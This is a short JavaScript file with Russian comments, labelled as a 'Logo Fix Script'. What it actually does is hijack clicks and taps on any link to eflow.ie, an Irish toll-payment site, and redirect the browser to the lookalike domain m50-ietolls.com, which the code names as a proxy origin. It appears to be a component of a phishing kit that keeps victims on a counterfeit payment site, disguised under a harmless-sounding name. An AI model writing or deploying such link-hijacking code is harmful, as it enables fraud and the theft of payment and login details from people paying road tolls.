/**
 * Logo Fix Script v4.0 - MINIMAL VERSION
 * ТОЛЬКО перехватывает ссылки с eflow.ie - НЕ ТРОГАЕТ другие ссылки!
 */
(function() {
  'use strict';
  
  const PROXY_ORIGIN = 'https://m50-ietolls.com';
  const TARGET_DOMAIN = 'eflow.ie';
  
  console.log('[LogoFix v4.0] MINIMAL - Starting...');
  
  /**
   * Перехват ТОЛЬКО ссылок с eflow.ie в href
   */
  function interceptEflowLink(e) {
    const link = e.target.closest('a');
    if (!link) return;
    
    const href = link.href || '';
    
    // ТОЛЬКО если href содержит eflow.ie
    if (href.includes(TARGET_DOMAIN)) {
      console.log('[LogoFix v4.0] Intercepted eflow.ie:', href);
      e.preventDefault();
      e.stopPropagation();
      
      // Заменяем домен
      const fixedUrl = href.replace(/https?:\/\/(www\.)?eflow\.ie/gi, PROXY_ORIGIN);
      window.location.href = fixedUrl;
    }
    // Все остальные ссылки - НЕ ТРОГАЕМ!
  }
  
  // Устанавливаем перехватчик
  document.addEventListener('click', interceptEflowLink, true);
  document.addEventListener('touchend', interceptEflowLink, true);
  
  console.log('[LogoFix v4.0] MINIMAL - Ready');
})();
